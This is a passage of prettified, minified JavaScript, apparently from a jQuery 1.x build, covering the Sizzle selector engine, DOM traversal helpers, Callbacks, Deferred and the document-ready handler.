            z = o(),
            J = function(e, t) {
                return e === t && (P = !0), 0
            },
            q = 1 << 31,
            $ = {}.hasOwnProperty,
            X = [],
            Y = X.pop,
            K = X.push,
            Q = X.push,
            Z = X.slice,
            ee = function(e, t) {
                for (var n = 0, o = e.length; n < o; n++)
                    if (e[n] === t)
                        return n;
                return -1
            },
            te = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
            ne = "[\\x20\\t\\r\\n\\f]",
            oe = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
            ie = oe.replace("w", "w#"),
            re = "\\[" + ne + "*(" + oe + ")(?:" + ne + "*([*^$|!~]?=)" + ne + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + ie + "))|)" + ne + "*\\]",
            ae = ":(" + oe + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + re + ")*)|.*)\\)|)",
            se = new RegExp(ne + "+", "g"),
            le = new RegExp("^" + ne + "+|((?:^|[^\\\\])(?:\\\\.)*)" + ne + "+$", "g"),
            ce = new RegExp("^" + ne + "*," + ne + "*"),
            ue = new RegExp("^" + ne + "*([>+~]|" + ne + ")" + ne + "*"),
            de = new RegExp("=" + ne + "*([^\\]'\"]*?)" + ne + "*\\]", "g"),
            fe = new RegExp(ae),
            he = new RegExp("^" + ie + "$"),
            pe = {
                ID: new RegExp("^#(" + oe + ")"),
                CLASS: new RegExp("^\\.(" + oe + ")"),
                TAG: new RegExp("^(" + oe.replace("w", "w*") + ")"),
                ATTR: new RegExp("^" + re),
                PSEUDO: new RegExp("^" + ae),
                CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + ne + "*(even|odd|(([+-]|)(\\d*)n|)" + ne + "*(?:([+-]|)" + ne + "*(\\d+)|))" + ne + "*\\)|)", "i"),
                bool: new RegExp("^(?:" + te + ")$", "i"),
                needsContext: new RegExp("^" + ne + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + ne + "*((?:-\\d)?\\d*)" + ne + "*\\)|)(?=[^-]|$)", "i")
            },
            ge = /^(?:input|select|textarea|button)$/i,
            me = /^h\d$/i,
            ve = /^[^{]+\{\s*\[native \w/,
            Te = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
            Se = /[+~]/,
            ye = /'|\\/g,
            be = new RegExp("\\\\([\\da-f]{1,6}" + ne + "?|(" + ne + ")|.)", "ig"),
            xe = function(e, t, n) {
                var o = "0x" + t - 65536;
                return o != o || n ? t : o < 0 ? String.fromCharCode(o + 65536) : String.fromCharCode(o >> 10 | 55296, 1023 & o | 56320)
            },
            we = function() {
                F()
            };
        try {
            Q.apply(X = Z.call(O.childNodes), O.childNodes),
            X[O.childNodes.length].nodeType
        } catch (Ve) {
            Q = {
                apply: X.length ? function(e, t) {
                    K.apply(e, Z.call(t))
                } : function(e, t) {
                    for (var n = e.length, o = 0; e[n++] = t[o++];)
                        ;
                    e.length = n - 1
                }
            }
        }
        for (m in v = y.support = {}, V = y.isXML = function(e) {
            var t = e && (e.ownerDocument || e).documentElement;
            return !!t && "HTML" !== t.nodeName
        }, F = y.setDocument = function(e) {
            var t,
                n,
                l = e ? e.ownerDocument || e : O;
            return l !== A && 9 === l.nodeType && l.documentElement ? (_ = (A = l).documentElement, (n = l.defaultView) && n !== n.top && (n.addEventListener ? n.addEventListener("unload", we, !1) : n.attachEvent && n.attachEvent("onunload", we)), B = !V(l), v.attributes = i(function(e) {
                return e.className = "i", !e.getAttribute("className")
            }), v.getElementsByTagName = i(function(e) {
                return e.appendChild(l.createComment("")), !e.getElementsByTagName("*").length
            }), v.getElementsByClassName = ve.test(l.getElementsByClassName), v.getById = i(function(e) {
                return _.appendChild(e).id = M, !l.getElementsByName || !l.getElementsByName(M).length
            }), v.getById ? (x.find.ID = function(e, t) {
                if ("undefined" != typeof t.getElementById && B) {
                    var n = t.getElementById(e);
                    return n && n.parentNode ? [n] : []
                }
            }, x.filter.ID = function(e) {
                var t = e.replace(be, xe);
                return function(e) {
                    return e.getAttribute("id") === t
                }
            }) : (delete x.find.ID, x.filter.ID = function(e) {
                var n = e.replace(be, xe);
                return function(e) {
                    var t = "undefined" != typeof e.getAttributeNode && e.getAttributeNode("id");
                    return t && t.value === n
                }
            }), x.find.TAG = v.getElementsByTagName ? function(e, t) {
                return "undefined" != typeof t.getElementsByTagName ? t.getElementsByTagName(e) : v.qsa ? t.querySelectorAll(e) : void 0
            } : function(e, t) {
                var n,
                    o = [],
                    i = 0,
                    r = t.getElementsByTagName(e);
                if ("*" === e) {
                    for (; n = r[i++];)
                        1 === n.nodeType && o.push(n);
                    return o
                }
                return r
            }, x.find.CLASS = v.getElementsByClassName && function(e, t) {
                return B ? t.getElementsByClassName(e) : void 0
            }, R = [], H = [], (v.qsa = ve.test(l.querySelectorAll)) && (i(function(e) {
                _.appendChild(e).innerHTML = "<a id='" + M + "'></a><select id='" + M + "-\f]' msallowcapture=''><option selected=''></option></select>",
                e.querySelectorAll("[msallowcapture^='']").length && H.push("[*^$]=" + ne + "*(?:''|\"\")"),
                e.querySelectorAll("[selected]").length || H.push("\\[" + ne + "*(?:value|" + te + ")"),
                e.querySelectorAll("[id~=" + M + "-]").length || H.push("~="),
                e.querySelectorAll(":checked").length || H.push(":checked"),
                e.querySelectorAll("a#" + M + "+*").length || H.push(".#.+[+~]")
            }), i(function(e) {
                var t = l.createElement("input");
                t.setAttribute("type", "hidden"),
                e.appendChild(t).setAttribute("name", "D"),
                e.querySelectorAll("[name=d]").length && H.push("name" + ne + "*[*^$|!~]?="),
                e.querySelectorAll(":enabled").length || H.push(":enabled", ":disabled"),
                e.querySelectorAll("*,:x"),
                H.push(",.*:")
            })), (v.matchesSelector = ve.test(L = _.matches || _.webkitMatchesSelector || _.mozMatchesSelector || _.oMatchesSelector || _.msMatchesSelector)) && i(function(e) {
                v.disconnectedMatch = L.call(e, "div"),
                L.call(e, "[s!='']:x"),
                R.push("!=", ae)
            }), H = H.length && new RegExp(H.join("|")), R = R.length && new RegExp(R.join("|")), t = ve.test(_.compareDocumentPosition), j = t || ve.test(_.contains) ? function(e, t) {
                var n = 9 === e.nodeType ? e.documentElement : e,
                    o = t && t.parentNode;
                return e === o || !(!o || 1 !== o.nodeType || !(n.contains ? n.contains(o) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(o)))
            } : function(e, t) {
                if (t)
                    for (; t = t.parentNode;)
                        if (t === e)
                            return !0;
                return !1
            }, J = t ? function(e, t) {
                if (e === t)
                    return P = !0, 0;
                var n = !e.compareDocumentPosition - !t.compareDocumentPosition;
                return n || (1 & (n = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !v.sortDetached && t.compareDocumentPosition(e) === n ? e === l || e.ownerDocument === O && j(O, e) ? -1 : t === l || t.ownerDocument === O && j(O, t) ? 1 : N ? ee(N, e) - ee(N, t) : 0 : 4 & n ? -1 : 1)
            } : function(e, t) {
                if (e === t)
                    return P = !0, 0;
                var n,
                    o = 0,
                    i = e.parentNode,
                    r = t.parentNode,
                    a = [e],
                    s = [t];
                if (!i || !r)
                    return e === l ? -1 : t === l ? 1 : i ? -1 : r ? 1 : N ? ee(N, e) - ee(N, t) : 0;
                if (i === r)
                    return c(e, t);
                for (n = e; n = n.parentNode;)
                    a.unshift(n);
                for (n = t; n = n.parentNode;)
                    s.unshift(n);
                for (; a[o] === s[o];)
                    o++;
                return o ? c(a[o], s[o]) : a[o] === O ? -1 : s[o] === O ? 1 : 0
            }, l) : A
        }, y.matches = function(e, t) {
            return y(e, null, null, t)
        }, y.matchesSelector = function(e, t) {
            if ((e.ownerDocument || e) !== A && F(e), t = t.replace(de, "='$1']"), !(!v.matchesSelector || !B || R && R.test(t) || H && H.test(t)))
                try {
                    var n = L.call(e, t);
                    if (n || v.disconnectedMatch || e.document && 11 !== e.document.nodeType)
                        return n
                } catch (i) {}
            return 0 < y(t, A, null, [e]).length
        }, y.contains = function(e, t) {
            return (e.ownerDocument || e) !== A && F(e), j(e, t)
        }, y.attr = function(e, t) {
            (e.ownerDocument || e) !== A && F(e);
            var n = x.attrHandle[t.toLowerCase()],
                o = n && $.call(x.attrHandle, t.toLowerCase()) ? n(e, t, !B) : void 0;
            return void 0 !== o ? o : v.attributes || !B ? e.getAttribute(t) : (o = e.getAttributeNode(t)) && o.specified ? o.value : null
        }, y.error = function(e) {
            throw new Error("Syntax error, unrecognized expression: " + e)
        }, y.uniqueSort = function(e) {
            var t,
                n = [],
                o = 0,
                i = 0;
            if (P = !v.detectDuplicates, N = !v.sortStable && e.slice(0), e.sort(J), P) {
                for (; t = e[i++];)
                    t === e[i] && (o = n.push(i));
                for (; o--;)
                    e.splice(n[o], 1)
            }
            return N = null, e
        }, w = y.getText = function(e) {
            var t,
                n = "",
                o = 0,
                i = e.nodeType;
            if (i) {
                if (1 === i || 9 === i || 11 === i) {
                    if ("string" == typeof e.textContent)
                        return e.textContent;
                    for (e = e.firstChild; e; e = e.nextSibling)
                        n += w(e)
                } else if (3 === i || 4 === i)
                    return e.nodeValue
            } else
                for (; t = e[o++];)
                    n += w(t);
            return n
        }, (x = y.selectors = {
            cacheLength: 50,
            createPseudo: l,
            match: pe,
            attrHandle: {},
            find: {},
            relative: {
                ">": {
                    dir: "parentNode",
                    first: !0
                },
                " ": {
                    dir: "parentNode"
                },
                "+": {
                    dir: "previousSibling",
                    first: !0
                },
                "~": {
                    dir: "previousSibling"
                }
            },
            preFilter: {
                ATTR: function(e) {
                    return e[1] = e[1].replace(be, xe), e[3] = (e[3] || e[4] || e[5] || "").replace(be, xe), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4)
                },
                CHILD: function(e) {
                    return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || y.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && y.error(e[0]), e
                },
                PSEUDO: function(e) {
                    var t,
                        n = !e[6] && e[2];
                    return pe.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : n && fe.test(n) && (t = C(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3))
                }
            },
            filter: {
                TAG: function(e) {
                    var t = e.replace(be, xe).toLowerCase();
                    return "*" === e ? function() {
                        return !0
                    } : function(e) {
                        return e.nodeName && e.nodeName.toLowerCase() === t
                    }
                },
                CLASS: function(e) {
                    var t = W[e + " "];
                    return t || (t = new RegExp("(^|" + ne + ")" + e + "(" + ne + "|$)")) && W(e, function(e) {
                            return t.test("string" == typeof e.className && e.className || "undefined" != typeof e.getAttribute && e.getAttribute("class") || "")
                        })
                },
                ATTR: function(n, o, i) {
                    return function(e) {
                        var t = y.attr(e, n);
                        return null == t ? "!=" === o : !o || (t += "", "=" === o ? t === i : "!=" === o ? t !== i : "^=" === o ? i && 0 === t.indexOf(i) : "*=" === o ? i && -1 < t.indexOf(i) : "$=" === o ? i && t.slice(-i.length) === i : "~=" === o ? -1 < (" " + t.replace(se, " ") + " ").indexOf(i) : "|=" === o && (t === i || t.slice(0, i.length + 1) === i + "-"))
                    }
                },
                CHILD: function(h, e, t, p, g) {
                    var m = "nth" !== h.slice(0, 3),
                        v = "last" !== h.slice(-4),
                        T = "of-type" === e;
                    return 1 === p && 0 === g ? function(e) {
                        return !!e.parentNode
                    } : function(e, t, n) {
                        var o,
                            i,
                            r,
                            a,
                            s,
                            l,
                            c = m !== v ? "nextSibling" : "previousSibling",
                            u = e.parentNode,
                            d = T && e.nodeName.toLowerCase(),
                            f = !n && !T;
                        if (u) {
                            if (m) {
                                for (; c;) {
                                    for (r = e; r = r[c];)
                                        if (T ? r.nodeName.toLowerCase() === d : 1 === r.nodeType)
                                            return !1;
                                    l = c = "only" === h && !l && "nextSibling"
                                }
                                return !0
                            }
                            if (l = [v ? u.firstChild : u.lastChild], v && f) {
                                for (s = (o = (i = u[M] || (u[M] = {}))[h] || [])[0] === D && o[1], a = o[0] === D && o[2], r = s && u.childNodes[s]; r = ++s && r && r[c] || (a = s = 0) || l.pop();)
                                    if (1 === r.nodeType && ++a && r === e) {
                                        i[h] = [D, s, a];
                                        break
                                    }
                            } else if (f && (o = (e[M] || (e[M] = {}))[h]) && o[0] === D)
                                a = o[1];
                            else
                                for (; (r = ++s && r && r[c] || (a = s = 0) || l.pop()) && ((T ? r.nodeName.toLowerCase() !== d : 1 !== r.nodeType) || !++a || (f && ((r[M] || (r[M] = {}))[h] = [D, a]), r !== e));)
                                    ;
                            return (a -= g) === p || a % p == 0 && 0 <= a / p
                        }
                    }
                },
                PSEUDO: function(e, r) {
                    var t,
                        a = x.pseudos[e] || x.setFilters[e.toLowerCase()] || y.error("unsupported pseudo: " + e);
                    return a[M] ? a(r) : 1 < a.length ? (t = [e, e, "", r], x.setFilters.hasOwnProperty(e.toLowerCase()) ? l(function(e, t) {
                        for (var n, o = a(e, r), i = o.length; i--;)
                            e[n = ee(e, o[i])] = !(t[n] = o[i])
                    }) : function(e) {
                        return a(e, 0, t)
                    }) : a
                }
            },
            pseudos: {
                not: l(function(e) {
                    var o = [],
                        i = [],
                        s = k(e.replace(le, "$1"));
                    return s[M] ? l(function(e, t, n, o) {
                        for (var i, r = s(e, null, o, []), a = e.length; a--;)
                            (i = r[a]) && (e[a] = !(t[a] = i))
                    }) : function(e, t, n) {
                        return o[0] = e, s(o, null, n, i), o[0] = null, !i.pop()
                    }
                }),
                has: l(function(t) {
                    return function(e) {
                        return 0 < y(t, e).length
                    }
                }),
                contains: l(function(t) {
                    return t = t.replace(be, xe), function(e) {
                        return -1 < (e.textContent || e.innerText || w(e)).indexOf(t)
                    }
                }),
                lang: l(function(n) {
                    return he.test(n || "") || y.error("unsupported lang: " + n), n = n.replace(be, xe).toLowerCase(), function(e) {
                        var t;
                        do {
                            if (t = B ? e.lang : e.getAttribute("xml:lang") || e.getAttribute("lang"))
                                return (t = t.toLowerCase()) === n || 0 === t.indexOf(n + "-")
                        } while ((e = e.parentNode) && 1 === e.nodeType);
                        return !1
                    }
                }),
                target: function(e) {
                    var t = n.location && n.location.hash;
                    return t && t.slice(1) === e.id
                },
                root: function(e) {
                    return e === _
                },
                focus: function(e) {
                    return e === A.activeElement && (!A.hasFocus || A.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                },
                enabled: function(e) {
                    return !1 === e.disabled
                },
                disabled: function(e) {
                    return !0 === e.disabled
                },
                checked: function(e) {
                    var t = e.nodeName.toLowerCase();
                    return "input" === t && !!e.checked || "option" === t && !!e.selected
                },
                selected: function(e) {
                    return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected
                },
                empty: function(e) {
                    for (e = e.firstChild; e; e = e.nextSibling)
                        if (e.nodeType < 6)
                            return !1;
                    return !0
                },
                parent: function(e) {
                    return !x.pseudos.empty(e)
                },
                header: function(e) {
                    return me.test(e.nodeName)
                },
                input: function(e) {
                    return ge.test(e.nodeName)
                },
                button: function(e) {
                    var t = e.nodeName.toLowerCase();
                    return "input" === t && "button" === e.type || "button" === t
                },
                text: function(e) {
                    var t;
                    return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase())
                },
                first: a(function() {
                    return [0]
                }),
                last: a(function(e, t) {
                    return [t - 1]
                }),
                eq: a(function(e, t, n) {
                    return [n < 0 ? n + t : n]
                }),
                even: a(function(e, t) {
                    for (var n = 0; n < t; n += 2)
                        e.push(n);
                    return e
                }),
                odd: a(function(e, t) {
                    for (var n = 1; n < t; n += 2)
                        e.push(n);
                    return e
                }),
                lt: a(function(e, t, n) {
                    for (var o = n < 0 ? n + t : n; 0 <= --o;)
                        e.push(o);
                    return e
                }),
                gt: a(function(e, t, n) {
                    for (var o = n < 0 ? n + t : n; ++o < t;)
                        e.push(o);
                    return e
                })
            }
        }).pseudos.nth = x.pseudos.eq, {
            radio: !0,
            checkbox: !0,
            file: !0,
            password: !0,
            image: !0
        })
            x.pseudos[m] = t(m);
        for (m in {
            submit: !0,
            reset: !0
        })
            x.pseudos[m] = r(m);
        return s.prototype = x.filters = x.pseudos, x.setFilters = new s, C = y.tokenize = function(e, t) {
            var n,
                o,
                i,
                r,
                a,
                s,
                l,
                c = G[e + " "];
            if (c)
                return t ? 0 : c.slice(0);
            for (a = e, s = [], l = x.preFilter; a;) {
                for (r in (!n || (o = ce.exec(a))) && (o && (a = a.slice(o[0].length) || a), s.push(i = [])), n = !1, (
                o = ue.exec(a)) && (n = o.shift(), i.push({
                    value: n,
                    type: o[0].replace(le, " ")
                }), a = a.slice(n.length)), x.filter)
                    !(o = pe[r].exec(a)) || l[r] && !(o = l[r](o)) || (n = o.shift(), i.push({
                        value: n,
                        type: r,
                        matches: o
                    }), a = a.slice(n.length));
                if (!n)
                    break
            }
            return t ? a.length : a ? y.error(e) : G(e, s).slice(0)
        }, k = y.compile = function(e, t) {
            var n,
                o = [],
                i = [],
                r = z[e + " "];
            if (!r) {
                for (t || (t = C(e)), n = t.length; n--;)
                    (r = h(t[n]))[M] ? o.push(r) : i.push(r);
                (r = z(e, u(i, o))).selector = e
            }
            return r
        }, E = y.select = function(e, t, n, o) {
            var i,
                r,
                a,
                s,
                l,
                c = "function" == typeof e && e,
                u = !o && C(e = c.selector || e);
            if (n = n || [], 1 === u.length) {
                if (2 < (r = u[0] = u[0].slice(0)).length && "ID" === (a = r[0]).type && v.getById && 9 === t.nodeType && B && x.relative[r[1].type]) {
                    if (!(t = (x.find.ID(a.matches[0].replace(be, xe), t) || [])[0]))
                        return n;
                    c && (t = t.parentNode),
                    e = e.slice(r.shift().value.length)
                }
                for (i = pe.needsContext.test(e) ? 0 : r.length; i-- && (a = r[i], !x.relative[s = a.type]);)
                    if ((l = x.find[s]) && (o = l(a.matches[0].replace(be, xe), Se.test(r[0].type) && p(t.parentNode) || t))) {
                        if (r.splice(i, 1), !(e = o.length && g(r)))
                            return Q.apply(n, o), n;
                        break
                    }
            }
            return (c || k(e, u))(o, t, !B, n, Se.test(e) && p(t.parentNode) || t), n
        }, v.sortStable = M.split("").sort(J).join("") === M, v.detectDuplicates = !!P, F(), v.sortDetached = i(function(e) {
            return 1 & e.compareDocumentPosition(A.createElement("div"))
        }), i(function(e) {
            return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href")
        }) || e("type|href|height|width", function(e, t, n) {
            return n ? void 0 : e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2)
        }), v.attributes && i(function(e) {
            return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value")
        }) || e("value", function(e, t, n) {
            return n || "input" !== e.nodeName.toLowerCase() ? void 0 : e.defaultValue
        }), i(function(e) {
            return null == e.getAttribute("disabled")
        }) || e(te, function(e, t, n) {
            var o;
            return n ? void 0 : !0 === e[t] ? t.toLowerCase() : (o = e.getAttributeNode(t)) && o.specified ? o.value : null
        }), y
    }(p);
    ie.find = ce,
    ie.expr = ce.selectors,
    ie.expr[":"] = ie.expr.pseudos,
    ie.unique = ce.uniqueSort,
    ie.text = ce.getText,
    ie.isXMLDoc = ce.isXML,
    ie.contains = ce.contains;
    var ue = ie.expr.match.needsContext,
        de = /^<(\w+)\s*\/?>(?:<\/\1>|)$/,
        fe = /^.[^:#\[\.,]*$/;
    ie.filter = function(e, t, n) {
        var o = t[0];
        return n && (e = ":not(" + e + ")"), 1 === t.length && 1 === o.nodeType ? ie.find.matchesSelector(o, e) ? [o] : [] : ie.find.matches(e, ie.grep(t, function(e) {
            return 1 === e.nodeType
        }))
    },
    ie.fn.extend({
        find: function(e) {
            var t,
                n = [],
                o = this,
                i = o.length;
            if ("string" != typeof e)
                return this.pushStack(ie(e).filter(function() {
                    for (t = 0; t < i; t++)
                        if (ie.contains(o[t], this))
                            return !0
                }));
            for (t = 0; t < i; t++)
                ie.find(e, o[t], n);
            return (n = this.pushStack(1 < i ? ie.unique(n) : n)).selector = this.selector ? this.selector + " " + e : e, n
        },
        filter: function(e) {
            return this.pushStack(o(this, e || [], !1))
        },
        not: function(e) {
            return this.pushStack(o(this, e || [], !0))
        },
        is: function(e) {
            return !!o(this, "string" == typeof e && ue.test(e) ? ie(e) : e || [], !1).length
        }
    });
    var he,
        pe = p.document,
        ge = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/;
    (ie.fn.init = function(e, t) {
        var n,
            o;
        if (!e)
            return this;
        if ("string" == typeof e) {
            if (!(n = "<" === e.charAt(0) && ">" === e.charAt(e.length - 1) && 3 <= e.length ? [null, e, null] : ge.exec(e)) || !n[1] && t)
                return !t || t.jquery ? (t || he).find(e) : this.constructor(t).find(e);
            if (n[1]) {
                if (t = t instanceof ie ? t[0] : t, ie.merge(this, ie.parseHTML(n[1], t && t.nodeType ? t.ownerDocument || t : pe, !0)), de.test(n[1]) && ie.isPlainObject(t))
                    for (n in t)
                        ie.isFunction(this[n]) ? this[n](t[n]) : this.attr(n, t[n]);
                return this
            }
            if ((o = pe.getElementById(n[2])) && o.parentNode) {
                if (o.id !== n[2])
                    return he.find(e);
                this.length = 1,
                this[0] = o
            }
            return this.context = pe, this.selector = e, this
        }
        return e.nodeType ? (this.context = this[0] = e, this.length = 1, this) : ie.isFunction(e) ? "undefined" != typeof he.ready ? he.ready(e) : e(ie) : (void 0 !== e.selector && (this.selector = e.selector, this.context = e.context), ie.makeArray(e, this))
    }).prototype = ie.fn,
    he = ie(pe);
    var me = /^(?:parents|prev(?:Until|All))/,
        ve = {
            children: !0,
            contents: !0,
            next: !0,
            prev: !0
        };
    ie.extend({
        dir: function(e, t, n) {
            for (var o = [], i = e[t]; i && 9 !== i.nodeType && (void 0 === n || 1 !== i.nodeType || !ie(i).is(n));)
                1 === i.nodeType && o.push(i),
                i = i[t];
            return o
        },
        sibling: function(e, t) {
            for (var n = []; e; e = e.nextSibling)
                1 === e.nodeType && e !== t && n.push(e);
            return n
        }
    }),
    ie.fn.extend({
        has: function(e) {
            var t,
                n = ie(e, this),
                o = n.length;
            return this.filter(function() {
                for (t = 0; t < o; t++)
                    if (ie.contains(this, n[t]))
                        return !0
            })
        },
        closest: function(e, t) {
            for (var n, o = 0, i = this.length, r = [], a = ue.test(e) || "string" != typeof e ? ie(e, t || this.context) : 0; o < i; o++)
                for (n = this[o]; n && n !== t; n = n.parentNode)
                    if (n.nodeType < 11 && (a ? -1 < a.index(n) : 1 === n.nodeType && ie.find.matchesSelector(n, e))) {
                        r.push(n);
                        break
                    }
            return this.pushStack(1 < r.length ? ie.unique(r) : r)
        },
        index: function(e) {
            return e ? "string" == typeof e ? ie.inArray(this[0], ie(e)) : ie.inArray(e.jquery ? e[0] : e, this) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
        },
        add: function(e, t) {
            return this.pushStack(ie.unique(ie.merge(this.get(), ie(e, t))))
        },
        addBack: function(e) {
            return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
        }
    }),
    ie.each({
        parent: function(e) {
            var t = e.parentNode;
            return t && 11 !== t.nodeType ? t : null
        },
        parents: function(e) {
            return ie.dir(e, "parentNode")
        },
        parentsUntil: function(e, t, n) {
            return ie.dir(e, "parentNode", n)
        },
        next: function(e) {
            return i(e, "nextSibling")
        },
        prev: function(e) {
            return i(e, "previousSibling")
        },
        nextAll: function(e) {
            return ie.dir(e, "nextSibling")
        },
        prevAll: function(e) {
            return ie.dir(e, "previousSibling")
        },
        nextUntil: function(e, t, n) {
            return ie.dir(e, "nextSibling", n)
        },
        prevUntil: function(e, t, n) {
            return ie.dir(e, "previousSibling", n)
        },
        siblings: function(e) {
            return ie.sibling((e.parentNode || {}).firstChild, e)
        },
        children: function(e) {
            return ie.sibling(e.firstChild)
        },
        contents: function(e) {
            return ie.nodeName(e, "iframe") ? e.contentDocument || e.contentWindow.document : ie.merge([], e.childNodes)
        }
    }, function(o, i) {
        ie.fn[o] = function(e, t) {
            var n = ie.map(this, i, e);
            return "Until" !== o.slice(-5) && (t = e), t && "string" == typeof t && (n = ie.filter(t, n)), 1 < this.length && (ve[o] || (n = ie.unique(n)), me.test(o) && (n = n.reverse())), this.pushStack(n)
        }
    });
    var Te,
        Se = /\S+/g,
        ye = {};
    ie.Callbacks = function(i) {
        i = "string" == typeof i ? ye[i] || e(i) : ie.extend({}, i);
        var r,
            t,
            n,
            a,
            o,
            s,
            l = [],
            c = !i.once && [],
            u = function(e) {
                for (t = i.memory && e, n = !0, o = s || 0, s = 0, a = l.length, r = !0; l && o < a; o++)
                    if (!1 === l[o].apply(e[0], e[1]) && i.stopOnFalse) {
                        t = !1;
                        break
                    }
                r = !1,
                l && (c ? c.length && u(c.shift()) : t ? l = [] : d.disable())
            },
            d = {
                add: function() {
                    if (l) {
                        var e = l.length;
                        !function o(e) {
                            ie.each(e, function(e, t) {
                                var n = ie.type(t);
                                "function" === n ? i.unique && d.has(t) || l.push(t) : t && t.length && "string" !== n && o(t)
                            })
                        }(arguments),
                        r ? a = l.length : t && (s = e, u(t))
                    }
                    return this
                },
                remove: function() {
                    return l && ie.each(arguments, function(e, t) {
                        for (var n; -1 < (n = ie.inArray(t, l, n));)
                            l.splice(n, 1),
                            r && (n <= a && a--, n <= o && o--)
                    }), this
                },
                has: function(e) {
                    return e ? -1 < ie.inArray(e, l) : !(!l || !l.length)
                },
                empty: function() {
                    return l = [], a = 0, this
                },
                disable: function() {
                    return l = c = t = void 0, this
                },
                disabled: function() {
                    return !l
                },
                lock: function() {
                    return c = void 0, t || d.disable(), this
                },
                locked: function() {
                    return !c
                },
                fireWith: function(e, t) {
                    return !l || n && !c || (t = [e, (t = t || []).slice ? t.slice() : t], r ? c.push(t) : u(t)), this
                },
                fire: function() {
                    return d.fireWith(this, arguments), this
                },
                fired: function() {
                    return !!n
                }
            };
        return d
    },
    ie.extend({
        Deferred: function(e) {
            var r = [["resolve", "done", ie.Callbacks("once memory"), "resolved"], ["reject", "fail", ie.Callbacks("once memory"), "rejected"], ["notify", "progress", ie.Callbacks("memory")]],
                i = "pending",
                a = {
                    state: function() {
                        return i
                    },
                    always: function() {
                        return s.done(arguments).fail(arguments), this
                    },
                    then: function() {
                        var i = arguments;
                        return ie.Deferred(function(o) {
                            ie.each(r, function(e, t) {
                                var n = ie.isFunction(i[e]) && i[e];
                                s[t[1]](function() {
                                    var e = n && n.apply(this, arguments);
                                    e && ie.isFunction(e.promise) ? e.promise().done(o.resolve).fail(o.reject).progress(o.notify) : o[t[0] + "With"](this === a ? o.promise() : this, n ? [e] : arguments)
                                })
                            }),
                            i = null
                        }).promise()
                    },
                    promise: function(e) {
                        return null != e ? ie.extend(e, a) : a
                    }
                },
                s = {};
            return a.pipe = a.then, ie.each(r, function(e, t) {
                var n = t[2],
                    o = t[3];
                a[t[1]] = n.add,
                o && n.add(function() {
                    i = o
                }, r[1 ^ e][2].disable, r[2][2].lock),
                s[t[0]] = function() {
                    return s[t[0] + "With"](this === s ? a : this, arguments), this
                },
                s[t[0] + "With"] = n.fireWith
            }), a.promise(s), e && e.call(s, s), s
        },
        when: function(e) {
            var i,
                t,
                n,
                o = 0,
                r = X.call(arguments),
                a = r.length,
                s = 1 !== a || e && ie.isFunction(e.promise) ? a : 0,
                l = 1 === s ? e : ie.Deferred(),
                c = function(t, n, o) {
                    return function(e) {
                        n[t] = this,
                        o[t] = 1 < arguments.length ? X.call(arguments) : e,
                        o === i ? l.notifyWith(n, o) : --s || l.resolveWith(n, o)
                    }
                };
            if (1 < a)
                for (i = new Array(a), t = new Array(a), n = new Array(a); o < a; o++)
                    r[o] && ie.isFunction(r[o].promise) ? r[o].promise().done(c(o, n, r)).fail(l.reject).progress(c(o, t, i)) : --s;
            return s || l.resolveWith(n, r), l.promise()
        }
    }),
    ie.fn.ready = function(e) {
        return ie.ready.promise().done(e), this
    },
    ie.extend({
        isReady: !1,
        readyWait: 1,
        holdReady: function(e) {
            e ? ie.readyWait++ : ie.ready(!0)
        },
        ready: function(e) {
            if (!0 === e ? !--ie.readyWait : !ie.isReady) {
                if (!pe.body)
                    return setTimeout(ie.ready);
                (ie.isReady = !0) !== e && 0 < --ie.readyWait || (Te.resolveWith(pe, [ie]), ie.fn.triggerHandler && (ie(pe).triggerHandler("ready"), ie(pe).off("ready")))
            }
        }
    }),
    ie.ready.promise = function(e) {
        if (!Te)
            if (Te = ie.Deferred(), "complete" === pe.readyState)
                setTimeout(ie.ready);
            else if (pe.addEventListener)
                pe.addEventListener("DOMContentLoaded", l, !1),
                p.addEventListener("load", l, !1);
            else {
                pe.attachEvent("onreadystatechange", l),
                p.attachEvent("onload", l);
                var t = !1;
                try {
                    t = null == p.frameElement && pe.documentElement
                } catch (o) {}
                t && t.doScroll && function i() {
                    if (!ie.isReady) {
                        try {
                            t.doScroll("left")
                        } catch (p) {
                            return setTimeout(i, 50)
                        }
                        n(),
                        ie.ready()
                    }
                }()
            }
        return Te.promise(e)
    };
    var be,
        xe = "undefined";
    for (be in ie(ne))
        break;
    ne.ownLast = "0" !== be,
    ne.inlineBlockNeedsLayout = !1,
    ie(function() {
        var e,
            t,
            n,
            o;
